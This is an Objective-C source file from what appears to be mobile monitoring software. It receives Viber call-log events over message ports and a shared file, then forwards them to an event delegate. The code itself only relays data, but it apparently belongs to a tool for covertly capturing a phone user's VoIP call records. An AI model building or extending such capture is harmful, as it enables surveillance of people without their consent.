//
//  ViberCallLogCaptureManager.m
//  ViberCallLogCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 9/3/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ViberCallLogCaptureManager.h"

#import "DefStd.h"
#import "FxVoIPEvent.h"
#import "EventDelegate.h"

#import <UIKit/UIKit.h>

@implementation ViberCallLogCaptureManager


@synthesize mEventDelegate;


- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;			
	}
	return self;
}

- (void) startCapture {
	DLog (@"Start capture Viber Call Log messenger");
	if (!mMessagePortReader1) {
		DLog (@"port 1")
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kViberCallLogMessagePort1 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		DLog (@"port 2")
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kViberCallLogMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];		
	}
	if (!mMessagePortReader3) {
		DLog (@"port 3")
		mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kViberCallLogMessagePort3
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader3 start];		
	}
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kViberCallLogMessagePort1
																		 withDelegate:self];
			[mSharedFileReader1 start];
		}
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Viber Call Log messenger");
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
	if (mMessagePortReader3) {
		[mMessagePortReader3 stop];
		[mMessagePortReader3 release];
		mMessagePortReader3 = nil;
	}
	
	if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver	= [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
	FxVoIPEvent *voIPEvent			= [unarchiver decodeObjectForKey:kViberArchied];
	DLog(@"Viber - voIPEvent = %@", voIPEvent);
    [unarchiver finishDecoding];
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		DLog (@"sending %@ ...", voIPEvent)
		if (mEventDelegate													&& 
			[mEventDelegate respondsToSelector:@selector(eventFinished:)]	){					
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:voIPEvent];
		}		
	}
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
